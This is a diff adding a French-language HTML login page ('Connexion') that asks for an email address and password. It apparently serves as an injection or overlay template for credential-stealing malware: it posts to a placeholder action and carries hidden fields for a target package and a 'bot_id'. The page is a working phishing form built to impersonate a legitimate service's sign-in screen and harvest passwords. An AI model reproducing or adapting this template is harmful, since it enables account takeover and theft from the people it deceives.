@@ -1,0 +1,235 @@
+<html>
+<head>
+    <style>
+
+        .fitMlbody {
+            padding: 0px !important;
+            margin-left: auto !important;
+            margin-right: auto !important
+        }
+
+        .fitMldoc {
+            padding: 0px 0 0px 0 !important;
+            margin: 0 !important
+
+        }
+
+        img {
+            border: 0;
+            margin-top: 5px;
+        }
+
+        @-ms-viewport {
+            width: device-width;
+            zoom: 1
+        }
+        .hidden {
+            display: none
+        }
+        body {
+            width: auto;
+            color: #000000;
+            font-size: small;
+            font-family: Arial, Sans-Serif;
+            margin: 0;
+            padding: 0;
+            background: #EEE;
+			height: 380px;
+        }
+
+        img {
+            border: 0;
+            margin: 0;
+            padding: 0;
+            vertical-align: middle
+        }
+
+        table {
+            border: 0;
+            margin: 0;
+            padding: 0;
+            border-collapse: collapse
+        }
+
+        div {
+            margin: 0;
+            padding: 0;
+            font-size: small
+        }
+
+        td {
+            margin: 0;
+            padding: 0;
+            vertical-align: middle;
+            font-size: small
+        }
+
+        a {
+            color: #000000;
+            font-size: small;
+            text-decoration: none
+        }
+
+        form {
+            margin: 0;
+            padding: 0;
+            border: 0
+        }
+
+        input {
+            vertical-align: middle
+        }
+
+        select {
+            vertical-align: middle;
+            margin: 0;
+            padding: 0;
+            font-weight: normal
+        }
+
+        button {
+            vertical-align: middle
+        }
+
+        textarea {
+            width: 90% !important
+        }
+
+        label {
+            margin: 0;
+            vertical-align: middle;
+            color: #003366
+        }
+
+        p {
+            margin: 0;
+            padding: 4px 0
+        }
+
+        h1 {
+            margin: 0;
+            padding: 4px 0;
+            font-weight: bold;
+            font-size: small
+        }
+
+        h2 {
+            margin: 0;
+            padding: 0;
+            font-weight: bold;
+            font-size: small
+        }
+
+        h3 {
+            margin: 0;
+            padding: 0;
+            font-weight: normal;
+            font-size: small
+        }
+
+
+        .submit_25 {
+            width: 99%;
+            border-color: #036;
+            background: #F3C440;
+            border: 0 none;
+            margin-top: 10px;
+            height: 110px;
+            color: #000;
+			float: right;
+			margin-right: 10px;
+			margin-bottom: 40px;
+			font-size: 26px;
+        }
+
+
+.input_100 {
+    width: 99%;
+    float: right;
+    margin-right: 10px;
+    border: 1px solid grey;
+    height: 50px;
+    margin-top: 10px;
+    font-size: 18px;
+    padding: 10px;
+}
+
+        .ptb {
+            padding: 4px 0
+        }
+
+
+        .content {
+            margin: 0;
+            padding: 0;
+            background-color: #EEE;
+            margin-left: 10px
+        }
+
+
+        .teaser_box {
+            margin-bottom: 10px;
+            border-color: #FFFFFF;
+            padding: 4px 0
+        }
+
+
+.fielderror {
+    width: 99%;
+    float: right;
+    margin-right: 10px;
+    border: 1px solid #f00;
+    height: 50px;
+    margin-top: 10px;
+    font-size: 18px;
+    padding: 10px;
+	}
+    </style>
+    <style></style>
+</head> 
+<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+<body class="fitMldoc">
+<div id="content_div">
+    <div style="background: rgb(243, 196, 64) none repeat scroll 0% 0%;color: rgb(0, 0, 0);text-align: center;font-size: 26px;padding: 22px;height: 35px;">Connexion</div>
+<br />
+<center>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKEAAAC1CAMAAAAAyG8JAAACylBMVEX///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AAAD7+/sAAAD09PQAAADo6OgAAADX19fX19erq6usrKwyMjI2NjYAAAD19fX39/fh4eGysrKzs7MkJCT9/f3r6+sAAAC8vLwAAAAeHh78/PwAAADh4eEAAACBgYEAAADv7+8AAACmpqYAAADy8vIAAAAAAAClpaWkpKTt7e3t7e0AAAD+/v4AAADc3NwAAAD4+PgAAAD+/v7d3d0AAAATExP09PQAAABlZWX+/v4AAADFxcUAAADe3t7e3t4AAAAAAAAAAADPz8+7u7v9/f0AAACOjo75+flAQEDLy8vy8vINDQ21tbXr6+v9/f2BgYHh4eH7+/v////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+/v7+/v7+/v7+/v4AAABwD1YcAAAA7nRSTlMAG0hykrLL3/H/AjR3seoHTaLspDqdY9QJcekEa+dE1UUVowBO6wiaIc4iP+5e+nB4Z2j9MPYT4AG4cy75A8wY8p+gKv6uryyhet49lJXoMn1+vfUzYWKQ2doRJTVAQisW/APpBskIqAqFhlhZLi8m1NSaXV4r87EiZx0q7RebEUMJvAFW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">
+</center>
+<div class="fitMlbody">
+
+    <section class="content">
+<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('input').each(function (i, value){  
+	$(value).css('border', '');
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+	  <input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+            <div class="teaser_box">
+                <div class="ptb">
+                    <input placeholder="Adresse e-mail *" name="fields[email]" id="e-mail" maxlength="60" class="input_100" type="text">
+                </div>
+                <br />
+
+                <div class="ptb">
+                    <input placeholder="Mot de passe *" class="input_100" name="fields[motdepasse]" id="passe" maxlength="50" type="password">
+
+                </div>
+                <div class="ptb">
+                    <center>
+                        <input value="Connexion" id="input_submitBtn" class="submit_25" type="submit" />
+                    </center>
+                </div>
+            </div>
+        </form>
+    </section>
+</div>
+</div>
+</body></html>
